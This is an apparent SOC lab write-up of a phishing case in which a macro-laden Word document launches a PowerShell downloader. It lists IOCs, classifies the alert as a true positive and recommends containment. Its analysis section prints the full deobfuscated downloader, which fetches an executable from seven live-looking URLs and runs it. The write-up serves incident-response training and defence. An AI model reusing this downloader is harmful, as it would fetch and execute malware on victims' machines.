# 	SOC102 - Proxy - Suspicious URL Detected (Event ID: 5)

## Executive Summary

On August 29, 2020, the Security Operations Center (SOC) detected suspicious network traffic to the domain `qstride.com` from the host **MikeComputer** (172.16.17.14). The investigation confirmed a successful, multi-stage malware infection that began with the user `Mike01` opening a weaponized document (`PTD-080120 ZGO-082920.doc`). The document's embedded macro executed a heavily obfuscated PowerShell "downloader" script. This script then successfully downloaded a secondary executable payload from a list of seven different compromised websites. The `Device Action: Allowed` confirms the initial download script ran successfully, and the host is fully compromised.

## Incident Details

The initial alert was triggered by a connection to a suspicious domain, which was the second stage of the attack:

<img width="1454" height="507" alt="image" src="https://github.com/user-attachments/assets/a324fd02-e9a5-4a25-8d78-ed027b23e602" />

| | |
| :--- | :--- |
| **Date of Incident**| August 29, 2020 |
| **Source Host**| MikeComputer (172.16.17.14) |
| **Username**| Mike01 |
| **Initial Vector**| Malicious Document (`PTD-080120 ZGO-082920.doc`) |
| **Initial Vector Hash (MD5)**| `21b3a9b03027779dc3070481a468b211` |
| **C2 Domains Contacted**| `qstride.com`<br>`tskgear.com`<br>`vermasiyaahi.com`<br>`www.weblabor.com.br`<br>`viniciusrangel.com`<br>`westvac.com`<br>`viewall.eu` |
| **Attack Type**| Phishing / Malware Dropper / PowerShell Downloader |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/5))* |

## Investigation and Analysis

### 1. Reconstructing the Attack Chain

The investigation revealed a classic, multi-stage infection chain.

**Stage 1: The Malicious Document (Initial Access)**
The attack began when the user `Mike01` opened a malicious Word document named `PTD-080120 ZGO-082920.doc`.
*   **Threat Intelligence:** The MD5 hash of this document, `21b3a9b03027779dc3070481a468b211`, was confirmed as malicious by **49 vendors on VirusTotal** and received a **100/100 score on Hybrid Analysis**.
    <img width="1776" height="734" alt="image" src="https://github.com/user-attachments/assets/d6953915-4dc8-49a9-bac0-8403584a81bd" />
    <img width="1761" height="615" alt="image" src="https://github.com/user-attachments/assets/61476001-551d-4013-8eae-3ca2a228b9c2" />
*   **Behavior:** Analysis confirms the document contains a heavily obfuscated VBA macro that automatically runs when the document is opened. The sole purpose of this macro is to launch PowerShell and execute the second-stage script.

**Stage 2: The PowerShell Downloader (Living-off-the-Land)**
The VBA macro's execution of PowerShell is the key pivot in the attack. The alert and log data show `powershell.exe` as the source process for the malicious network traffic, with the `.doc` file as its parent.
<img width="957" height="443" alt="image" src="https://github.com/user-attachments/assets/71e619b4-8ce0-491f-a298-31a79a591977" />

The deobfuscated PowerShell script below reveals a sophisticated downloader with built-in resiliency.

```powershell
#
# =================================================================================
# Deobfuscated Malicious PowerShell Downloader
#
# Original script was heavily obfuscated to evade detection. This version
# is cleaned up for analysis.
#
# WARNING: DO NOT EXECUTE THIS SCRIPT.
# =================================================================================
#

# Stage 1: Prepare the environment

# Define the path for the directory where the malware will be saved.
# This creates a folder named "wORD\2019" inside the user's temporary directory (e.g., C:\Users\Username\AppData\Local\Temp).
$malwareDirectory = Join-Path -Path $Env:Temp -ChildPath "wORD\2019"

# Create the directory if it doesn't exist.
if (-not (Test-Path -Path $malwareDirectory)) {
    New-Item -Path $malwareDirectory -ItemType Directory
}

# Ensure the script can download from modern secure websites (HTTPS).
# It enables TLS 1.2, 1.1, and 1.0 protocols for the connection.
[System.Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"

# Stage 2: Define download parameters

# Define the filename for the malicious executable that will be downloaded.
$malwareFileName = "Y85mi4vtd.exe"

# Construct the full path where the downloaded executable will be saved.
$downloadPath = Join-Path -Path $malwareDirectory -ChildPath $malwareFileName

# Create a list of URLs from which to download the payload.
# The script will try these one by one until it succeeds. This makes it resilient
# if one or more of the sites are taken down.
$urlList = @(
    "http://qstride.com/img/0/",
    "http://tskgear.com/wp-content/uploads/2015/06/pz/",
    "http://vermasiyaahi.com/cgi-bin/8/",
    "http://www.weblabor.com.br/avisos/QIU9/",
    "http://viniciusrangel.com/experimental/VIhMh1/",
    "http://westvac.com/wp-content/GOYx/",
    "https://viewall.eu/cgi-bin/SbhZP9X/"
)

# Create a web client object to handle the file download.
$webClient = New-Object System.Net.WebClient

# Stage 3: Download and execute the payload

# Loop through each URL in the list.
foreach ($url in $urlList) {
    try {
        # Attempt to download the file from the current URL and save it to the specified path.
        # The empty 'catch' block means that if a download fails, it will silently ignore the error and move to the next URL.
        $webClient.DownloadFile($url, $downloadPath)

        # After a successful download, check if the file size is at least 31,997 bytes.
        # This is a basic check to ensure a valid executable was downloaded and not an error page (which would be smaller).
        if ((Get-Item $downloadPath).Length -ge 31997) {
            
            # If the file size is valid, execute the downloaded malicious file.
            Invoke-Item -Path $downloadPath
            
            # Exit the loop since the mission is complete.
            break
        }
    }
    catch {
        # Silently continue to the next URL if an error occurs.
    }
}
```

**Stage 3: Connection to C2 Infrastructure**
Network logs and sandbox analysis confirm that the PowerShell script successfully made outbound GET requests to the list of C2 domains to download its payload. The initial alert for `qstride.com` was one of these successful attempts.
<img width="1317" height="368" alt="image" src="https://github.com/user-attachments/assets/d5bbbb75-a542-44e2-adf5-74c123b996f7" />

### 2. Confirmation of Success

Multiple pieces of evidence confirm the attack was successful.
*   **User Interaction:** Endpoint logs show the `.doc` file was opened by the user.
    <img width="1003" height="220" alt="image" src="https://github.com/user-attachments/assets/b482c7a1-746a-48eb-a20d-5754ed755b2b" />
*   **Script Execution:** The `Device Action: Allowed` and the logged network connection from `powershell.exe` confirm the second-stage script ran successfully and downloaded the final payload.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Network Logs, VirusTotal, Hybrid Analysis
*   **Skills Demonstrated:** Attack Chain Reconstruction, Phishing Analysis, Malware Triage (VBA/PowerShell), LOLBin Technique Recognition, Log Correlation.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** It is a C2 connection initiated by a malicious PowerShell script.
*   **What Is The Attack Type?** **Malware / Multi-stage Dropper.**
*   **Was the Attack Successful?** **Yes.** The user opened the document, and the PowerShell downloader was executed.
*   **Do You Need Tier 2 Escalation?** **Yes.** A successful malware infection requires full incident response.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC102 was a **true positive**. This alert, while appearing to be the start of the incident, was actually the second stage of a successful malware infection that began with a malicious document. The user's machine executed a PowerShell downloader and successfully retrieved a final payload from a C2 server. The host **MikeComputer** is fully compromised.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the host **MikeComputer** (172.16.17.14) from the network to prevent the final payload from executing or communicating with its C2 infrastructure.
2.  **CREDENTIALS - Disable and Reset:** Immediately disable the `Mike01` user account and reset their password.
3.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team for full forensic analysis.
4.  **INVESTIGATION:** The IR team must:
    *   Locate and analyze the final payload (`Y85mi4vtd.exe`) to determine its capabilities (e.g., RAT, ransomware, infostealer) and get its hash.
    *   Determine the initial access vector for the `.doc` file (likely a phishing email) and hunt for it in other mailboxes.
    *   Analyze the host for persistence mechanisms.
5.  **RECOVERY:** The compromised host must be wiped and re-imaged from a known-good source.
6.  **BLOCK INDICATORS:** Block all identified IOCs at the perimeter:
    *   **Hash:** `21b3a9b03027779dc3070481a468b211`.
    *   **Domains:** Block all seven C2 domains found in the PowerShell script: `qstride.com`, `tskgear.com`, `vermasiyaahi.com`, `www.weblabor.com.br`, `viniciusrangel.com`, `westvac.com`, and `viewall.eu`.





























